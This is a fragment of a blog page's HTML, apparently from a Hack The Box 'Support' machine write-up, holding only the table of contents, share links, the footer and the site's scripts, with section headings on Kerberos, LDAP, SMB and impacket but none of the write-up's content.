+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#information"><span class="toc-number">1.</span> <span class="toc-text"> Information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos"><span class="toc-number">1.1.</span> <span class="toc-text"> Kerberos</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap"><span class="toc-number">1.2.</span> <span class="toc-text"> LDAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#enumeration"><span class="toc-number">2.</span> <span class="toc-text"> Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E9%81%8D%E5%8E%86"><span class="toc-number">2.1.</span> <span class="toc-text"> 端口遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.</span> <span class="toc-text"> SMB共享目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crack-it"><span class="toc-number">3.</span> <span class="toc-text"> Crack It!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">3.1.</span> <span class="toc-text"> .NET程序集反编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap%E5%8D%8F%E8%AE%AE%E4%BA%A4%E4%BA%92"><span class="toc-number">3.2.</span> <span class="toc-text"> LDAP协议交互</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0user-flag"><span class="toc-number">3.3.</span> <span class="toc-text"> 拿到User flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0root-flag"><span class="toc-number">3.4.</span> <span class="toc-text"> 拿到Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rubeusexe%E5%86%92%E5%85%85ticket"><span class="toc-number">3.4.1.</span> <span class="toc-text"> Rubeus.exe冒充ticket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#impacket%E5%B7%A5%E5%85%B7%E9%9B%86%E8%BF%87%E9%AA%8C%E8%AF%81"><span class="toc-number">3.4.2.</span> <span class="toc-text"> impacket工具集过验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">4.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/08/htb-support/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/08/htb-support/&text=HTB Support Machine Challenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/08/htb-support/&is_video=false&description=HTB Support Machine Challenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Support Machine Challenge&body=Check out this article: http://example.com/2022/08/08/htb-support/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/08/htb-support/&name=HTB Support Machine Challenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/08/htb-support/&t=HTB Support Machine Challenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
